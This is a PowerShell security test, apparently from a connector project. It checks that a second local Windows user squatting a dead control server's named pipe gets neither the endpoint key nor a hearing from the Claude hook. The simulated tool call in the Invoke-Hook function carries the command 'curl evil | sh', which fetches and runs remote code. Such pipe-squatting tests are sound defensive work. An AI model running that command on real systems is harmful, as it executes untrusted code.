# A second local Windows user takes a dead control server's pipe name (AGENT-4016).
#
# The runner's user serves a connector control endpoint and answers one hook through the built
# Claude hook (extensions/connector-claude-code/dist/hook.cjs). A local user created here waits for
# that pipe name, the server closes, the user binds the name, and the hook fires again. The check
# fails if the stand-in receives the endpoint key or the hook prints anything the stand-in sent.
# Run from the repo root after `pnpm build`, as an administrator (it creates and deletes the user).
$ErrorActionPreference = "Stop"
$root = (Resolve-Path (Join-Path $PSScriptRoot "..\..\..")).Path
$node = (Get-Command node).Source
$hook = Join-Path $root "extensions\connector-claude-code\dist\hook.cjs"
$shared = "C:\cotal-standin"
$epFile = Join-Path $env:RUNNER_TEMP "standin-endpoint.json"
$log = Join-Path $shared "standin.log"
$user = "cotalstandin"
# `net user` asks for confirmation on a password over 14 characters, and there is no one to answer.
$password = "Cx1!" + [guid]::NewGuid().ToString("N").Substring(0, 10)

function Invoke-Hook($ep) {
  $env:COTAL_NAME = "victim"
  $env:COTAL_CONTROL_SOCKET = $ep.path
  $env:COTAL_LAUNCH_MATERIAL = $ep.material
  try {
    return ('{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl evil | sh"}}' | & $node $hook) -join "`n"
  } finally {
    Remove-Item Env:COTAL_NAME, Env:COTAL_CONTROL_SOCKET, Env:COTAL_LAUNCH_MATERIAL
  }
}
function Wait-For([scriptblock]$test, [string]$what, [int]$seconds = 30) {
  $deadline = (Get-Date).AddSeconds($seconds)
  while (-not (& $test)) {
    if ((Get-Date) -gt $deadline) { throw "timed out waiting for $what" }
    Start-Sleep -Milliseconds 100
  }
}

New-Item -ItemType Directory -Force $shared | Out-Null
icacls $shared /grant "Everyone:(OI)(CI)F" | Out-Null
Copy-Item (Join-Path $PSScriptRoot "standin.mjs") $shared -Force
net user $user $password /add | Out-Null
if ($LASTEXITCODE -ne 0) { throw "could not create the local user $user" }
$victim = $null
$standin = $null
try {
  Write-Host "== git $(git -C $root rev-parse --short HEAD), runner user $env:USERNAME, stand-in user $user (not an administrator)"
  $victim = Start-Process $node -ArgumentList "`"$(Join-Path $PSScriptRoot 'victim.mjs')`" `"$root`" `"$epFile`"" -PassThru -NoNewWindow
  Wait-For { Test-Path $epFile } "the victim's endpoint"
  $ep = Get-Content $epFile -Raw | ConvertFrom-Json
  $keyHash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($ep.token))).Replace("-", "").Substring(0, 12).ToLower()
  Write-Host "== endpoint $($ep.path), served by $($ep.user), key sha256 $keyHash"
  Write-Host "== 1. the hook against the real server prints:"
  $first = Invoke-Hook $ep
  Write-Host $first

  $credential = New-Object System.Management.Automation.PSCredential(".\$user", (ConvertTo-SecureString $password -AsPlainText -Force))
  $standin = Start-Process $node -ArgumentList "`"$shared\standin.mjs`" `"$($ep.path)`" `"$log`"" -Credential $credential -LoadUserProfile -WorkingDirectory $shared -PassThru -WindowStyle Hidden
  Wait-For { (Test-Path $log) -and ((Get-Content $log -Raw) -match "waiting for it to come free") } "the stand-in to start as $user"

  Write-Host "== 2. the connector's control server exits while the session runs on"
  New-Item -ItemType File "$epFile.stop" | Out-Null
  $victim.WaitForExit(15000) | Out-Null
  Wait-For { (Get-Content $log -Raw) -match "standin: bound" } "the stand-in to take the pipe name"

  Write-Host "== 3. the next hook prints:"
  $second = Invoke-Hook $ep
  Write-Host $second
  Start-Sleep -Milliseconds 500

  $standinLog = Get-Content $log -Raw
  Write-Host "== stand-in log:"
  Write-Host ($standinLog.Replace($ep.token, "<THE ENDPOINT KEY>"))
  $leaked = $standinLog.Contains($ep.token)
  $obeyed = $second -match "from $user"
  $realOk = $first -match "real server saw PreToolUse"
  Write-Host "== RESULT: real server answered=$realOk; stand-in received the key=$leaked; hook printed the stand-in's reply=$obeyed"
  if (-not $realOk) { throw "the hook did not get the real server's reply" }
  if ($leaked -or $obeyed) { throw "a second local user took the control endpoint's name and $(if ($leaked) { 'received the key' } else { 'was obeyed' })" }
  Write-Host "== the stand-in got no key and the hook used nothing it sent"
} finally {
  if ($standin -and -not $standin.HasExited) { Stop-Process -Id $standin.Id -Force -ErrorAction SilentlyContinue }
  if ($victim -and -not $victim.HasExited) { Stop-Process -Id $victim.Id -Force -ErrorAction SilentlyContinue }
  net user $user /delete | Out-Null
}
